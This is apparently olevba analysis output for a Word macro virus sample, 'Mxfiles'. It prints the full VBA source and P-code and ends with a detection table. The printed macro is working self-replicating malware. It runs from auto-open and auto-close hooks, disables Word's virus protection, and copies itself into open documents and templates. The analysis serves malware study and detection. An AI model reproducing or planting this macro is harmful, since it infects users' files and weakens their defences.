olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles.c - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
Mxfiles
End Sub
Sub Autoexit()
Mxfiles
End Sub
Sub Autoexec()
Mxfiles
End Sub
Sub Autonew()
Mxfiles
End Sub
Sub AutoOpen()
Mxfiles
End Sub
Sub Autoclose()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub
Sub Mxfiles()
'this is demo for Sk virus ,it do not make any thing
On Error Resume Next
Options.VirusProtection = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
SetAttr dd2, vbReadOnly
Next a
Dayn = Format(Date, "dd")
Monthn = Format(Date, "mm")
reg = Dayn Mod Monthn
If reg = 0 Then
txt = "ßáäÇ äÈÇíÚ ãÈÇÑß"
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=txt
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=txt + "                               Sk"
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mxfiles.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Mxfile - 3930 bytes
' Line #0:
' 	FuncDefn (Sub toolsmacro())
' Line #1:
' 	ArgsCall Mxfiles 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Autoexit())
' Line #4:
' 	ArgsCall Mxfiles 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Autoexec())
' Line #7:
' 	ArgsCall Mxfiles 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Autonew())
' Line #10:
' 	ArgsCall Mxfiles 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	ArgsCall Mxfiles 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub Autoclose())
' Line #16:
' 	ArgsCall Mxfiles 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub Openshell())
' Line #19:
' 	ArgsCall Mxfiles 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Mxfiles())
' Line #22:
' 	QuoteRem 0x0000 0x0033 "this is demo for Sk virus ,it do not make any thing"
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #25:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	St ddorg 
' Line #26:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	St dest 
' Line #29:
' 	Ld dest 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St dest 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld ddorg 
' 	Ld dest 
' 	Ne 
' 	IfBlock 
' Line #34:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dest 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #35:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld a 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd AttachedTemplate 
' 	St dd 
' Line #40:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dd1 
' Line #41:
' 	Ld dd1 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld dd 
' 	Add 
' 	St dd2 
' Line #42:
' 	Ld dd2 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #43:
' 	Ld ddorg 
' 	Ld dd2 
' 	Ne 
' 	IfBlock 
' Line #44:
' 	Ld ddorg 
' 	ParamNamed Source 
' 	Ld dd2 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Mxfile"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld dd2 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #47:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St Dayn 
' Line #49:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St Monthn 
' Line #50:
' 	Ld Dayn 
' 	Ld Monthn 
' 	Mod 
' 	St reg 
' Line #51:
' 	Ld reg 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0010 "ßáäÇ äÈÇíÚ ãÈÇÑß"
' 	St txt 
' Line #53:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #54:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #55:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #56:
' 	Ld txt 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #57:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #58:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #59:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #60:
' 	Ld txt 
' 	LitStr 0x0021 "                               Sk"
' 	Add 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #61:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

